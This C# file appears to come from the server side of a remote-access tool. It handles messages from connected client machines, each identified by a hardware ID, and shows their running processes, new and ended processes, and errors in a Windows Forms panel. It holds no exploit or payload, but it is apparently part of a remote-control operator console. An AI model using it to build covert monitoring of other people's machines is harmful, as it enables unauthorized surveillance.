using System.Collections;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerProcess
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormProcess form3 = (FormProcess)Application.OpenForms["Process:" + (string)objects[2]];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "Process [" + (string)objects[2] + "] Process [0]";
				form3.materialLabel1.Text = "Succues Connect";
				form3.client = client;
				form3.dataGridView2.Enabled = true;
			});
			client.Tag = form3;
			client.Hwid = (string)objects[2];
			break;
		}
		case "DeadProcess":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormProcess form2 = (FormProcess)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.materialLabel1.Text = "Dead Process pid: " + (int)objects[2];
				foreach (DataGridViewRow item in (IEnumerable)form2.dataGridView2.Rows)
				{
					if ((int)item.Cells[1].Value == (int)objects[2])
					{
						form2.dataGridView2.Rows.Remove(item);
						break;
					}
				}
				form2.Text = $"Process [{client.Hwid}] Process [{form2.dataGridView2.Rows.Count}]";
			});
			break;
		}
		case "NewProcess":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormProcess form4 = (FormProcess)client.Tag;
			form4.Invoke((MethodInvoker)delegate
			{
				form4.materialLabel1.Text = "New Process pid: " + (int)objects[4];
				DataGridViewRow dataGridViewRow2 = new DataGridViewRow
				{
					Cells = 
					{
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[2]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (int)objects[4]
						},
						(DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[3]
						}
					}
				};
				form4.dataGridView2.Rows.Add(dataGridViewRow2);
				form4.Text = $"Process [{client.Hwid}] Process [{form4.dataGridView2.Rows.Count}]";
			});
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormProcess form = (FormProcess)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		}
	}
}
